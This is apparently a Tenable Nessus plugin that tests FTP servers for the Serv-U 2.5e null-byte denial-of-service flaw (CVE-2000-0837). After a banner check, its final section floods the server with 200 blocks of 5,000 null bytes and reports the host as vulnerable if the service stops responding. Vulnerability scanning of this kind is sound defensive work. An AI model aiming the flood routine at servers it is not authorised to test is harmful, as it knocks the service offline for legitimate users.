#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10488);
 script_version("$Revision: 1.33 $");
 script_cvs_date("$Date: 2016/10/10 15:57:05 $");

 script_cve_id("CVE-2000-0837");
 script_bugtraq_id(1543);
 script_osvdb_id(387);

 script_name(english:"Serv-U 2.5e Null Byte Saturation DoS");
 script_summary(english:"Crashes Serv-U");

 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a remote denial of service
vulnerability.");
 script_set_attribute(attribute:"description", value:
"It is possible to crash the remote FTP service by sending it a large
number of null bytes. An attacker could exploit this flaw to deny
access to the FTP server.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2000/Aug/58");
 script_set_attribute(attribute:"solution", value:"Upgrade to FTP Serv-U 2.5f or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");

 script_set_attribute(attribute:"vuln_publication_date", value:"2000/08/04");
 script_set_attribute(attribute:"plugin_publication_date", value:"2000/08/04");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);	# ACT_FLOOD?
 script_family(english:"FTP");

 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");

 script_dependencie("ftpserver_detect_type_nd_version.nasl");
 script_require_keys("ftp/servu", "Settings/ParanoidReport");
 script_require_ports("Services/ftp", 21);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("ftp_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_ftp_port(default: 21);

banner = get_ftp_banner(port:port);
if ( ! banner || "Serv-U FTP Server" >!< banner ) exit(0);
if ( banner !~ "Serv-U FTP Server v[0-2]\." ) exit(0);

soc = open_sock_tcp(port);
if (! soc) exit(1);

 r = ftp_recv_line(socket:soc);
 if(!r)exit(0);
 req = string("HELP\r\n");
 send(socket:soc, data:req);
 r = ftp_recv_line(socket:soc);
 if(!r)exit(0);

 zero = raw_string(0x00, 0x00);
 req = crap(length:5000, data:zero) + string("\r\n");
 for(i=0;i<200;i=i+1) send(socket:soc, data:req);
 r = ftp_recv_line(socket:soc);
 close(soc);


 r = NULL;
 soc2 = open_sock_tcp(port);
 if (soc2) r = ftp_recv_line(socket:soc2, retry: 2);
 if(!r)security_warning(port);
